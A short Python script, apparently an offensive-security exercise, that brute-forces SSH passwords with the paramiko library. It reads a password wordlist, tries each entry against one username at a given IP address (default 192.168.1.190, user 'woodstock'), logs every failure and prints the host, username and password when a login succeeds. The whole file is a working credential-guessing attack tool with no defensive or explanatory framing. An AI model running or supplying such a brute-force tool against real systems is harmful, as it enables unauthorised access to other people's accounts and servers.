#!/usr/bin/env python3

from sys import exit

import paramiko


def read_file(file_path):
    """
    Offensive Mode
    """
    words = []
    try:
        with open(file_path, 'r', encoding='latin-1') as word_list:
            for word in word_list:
                words.append(word.rstrip())
    except Exception as e:
        exit(f"Issue: {e}")
    
    return words

def ssh_brute_force(ip, username, password_list):
    """
    Attempt SSH login
    https://docs.paramiko.org/en/2.4/api/client.html
    look_for_keys = False   # disable searching for discoverable private key files in ~/.ssh/
    allow_agent   = False   # disable connecting to the SSH agent
    """
    server = paramiko.SSHClient()
    server.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    print(f"""Checking {username}@{ip}:""")
    for password in password_list:
        try:
            server.connect(ip, username=username, password=password, timeout=1, look_for_keys=False, allow_agent=False)
            print(f"""
                  
                    SUCCESS

                      HOST: {ip}
                  USERNAME: {username}
                  PASSWORD: {password}

                  """)
            exit(0)
        except paramiko.AuthenticationException:
            print(f"FAILURE: {password}")
        finally:
            # Gracefully close connect
            server.close()


if __name__ == "__main__":

    ip = input("IP Address: ") or '192.168.1.190'
    username = input("Username: ") or 'woodstock'
    password_list = read_file("rus.txt")

    # ssh_brute_force(ip, username, password_list)
    ssh_brute_force(ip, username, password_list)

